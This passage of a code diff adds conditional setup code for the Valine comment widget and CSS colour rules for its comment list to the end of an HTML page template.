+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
